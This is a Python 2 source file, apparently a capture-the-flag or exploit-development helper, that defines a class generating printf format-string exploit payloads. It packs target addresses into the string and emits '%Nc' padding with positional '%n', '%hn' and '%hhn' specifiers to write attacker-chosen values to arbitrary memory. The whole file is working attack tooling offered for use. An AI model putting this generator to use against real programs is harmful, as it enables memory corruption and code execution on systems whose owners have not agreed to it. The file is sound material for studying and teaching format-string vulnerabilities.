#!/usr/bin/python2
# coding: utf-8

import re

# TODO
# Ajout adresses avant/apres

################################################################################
################################################################################

BYTE_REG  = ".."
BYTE_LEN  = 2
MODIFIERS = {
  1: "hh",
  2: "h",
  4: "",
  8: "l",
}

################################################################################
################################################################################

def bytesToHex(bytes_):
  return addModulus(bytes_ * 2)

def addModulus(number, modulus = 2):
  return number + number % modulus

def dataToString(data):
  return "".join(map(lambda x: chr(int(x, 16)), data))

def dataToHex(data):
  return "".join(map(lambda x: "\\x" + x, data))

################################################################################
################################################################################

class FormatString():
  def __init__(self, addr_bytes = 4, chunk_bytes = 2, endian = True):
    self.endian      = endian
    self.addr_bytes  = addr_bytes
    self.chunk_bytes = min(chunk_bytes, addr_bytes)

  def payload(self, addr, data, index, printable = False):
    data    = self.parseData(data)
    chunks  = self.parseAddr(addr, data)
    payload = ""
    counter = 0
    for i, chunk in enumerate(chunks):
      payload += dataToString(chunk[0]) if not printable else dataToHex(chunk[0])
      counter += self.addr_bytes
      chunk[2] = i
    for i, chunk in enumerate(chunks):
      addr_, value, index_ = chunk
      offset = value - counter
      if offset > 0:
        payload += "%{0:d}c".format(offset)
      elif offset < 0:
        exit("payload(): invalid offset")
      payload += "%{0:d}${1:s}n".format(index + index_, MODIFIERS[self.chunk_bytes])
      counter += offset
    return payload

  def parseAddr(self, addr, data):
    addrs       = []
    addr_length = bytesToHex(self.addr_bytes)
    for i in xrange(len(data)):
      addr_ = addr + i * self.chunk_bytes
      addr_ = self.splitData(self.formatData(addr_, addr_length), 1)
      addrs.append([addr_, int(data[i], 16), -1])
    addrs.sort(key = lambda x: x[1])
    return addrs

  def parseData(self, data):
    if isinstance(data, int):
      data_length = bytesToHex(self.addr_bytes)
    else:
      data_length = addModulus(len(data))
    return self.splitData(self.formatData(data, data_length), self.chunk_bytes)

  def formatData(self, data, length):
    data = "%x" % data
    return data.rjust(length, "0")

  def splitData(self, data, chunk_size):
    data = re.findall(BYTE_REG * chunk_size, data)
    return data[::-1] if self.endian else data
